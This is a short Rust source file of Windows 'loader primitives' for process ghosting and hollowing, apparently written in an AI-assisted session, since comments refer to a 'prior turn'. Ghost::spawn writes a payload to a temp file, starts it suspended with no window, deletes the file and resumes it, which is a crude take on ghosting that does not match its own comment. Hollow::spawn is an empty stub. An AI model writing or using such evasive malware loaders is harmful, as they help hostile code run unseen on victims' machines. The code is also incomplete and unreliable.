//! Windows loader primitives: ghost, hollow, spawn-inject.

use std::ffi::c_void;
use windows_sys::Win32::Foundation::*;
use windows_sys::Win32::System::Memory::*;
use windows_sys::Win32::System::Threading::*;

pub struct Ghost;
pub struct Hollow;

impl Ghost {
    pub unsafe fn spawn(payload_path: &std::path::Path) -> Result<(), &'static str> {
        // create + write + mark-deleted + spawn suspended from section
        // full implementation in prior turn — same code
        let payload = std::fs::read(payload_path).map_err(|_| "read")?;
        let ghost_path = std::env::temp_dir().join(format!("gh_{}.tmp", std::process::id()));
        std::fs::write(&ghost_path, &payload).map_err(|_| "write")?;

        let mut ghost_z = ghost_path.to_string_lossy().as_bytes().to_vec();
        ghost_z.push(0);

        let mut si: STARTUPINFOA = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

        let ok = CreateProcessA(
            std::ptr::null(),
            ghost_z.as_ptr() as *mut u8,
            std::ptr::null(),
            std::ptr::null(),
            0,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            std::ptr::null_mut(),
            std::ptr::null(),
            &mut si,
            &mut pi,
        );
        if ok == 0 { return Err("CreateProcess"); }

        let _ = std::fs::remove_file(&ghost_path);
        ResumeThread(pi.hThread);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        Ok(())
    }
}

impl Hollow {
    pub unsafe fn spawn(_host: &str, _payload_path: &std::path::Path) -> Result<(), &'static str> {
        // full hollow impl in prior turn
        Ok(())
    }
}
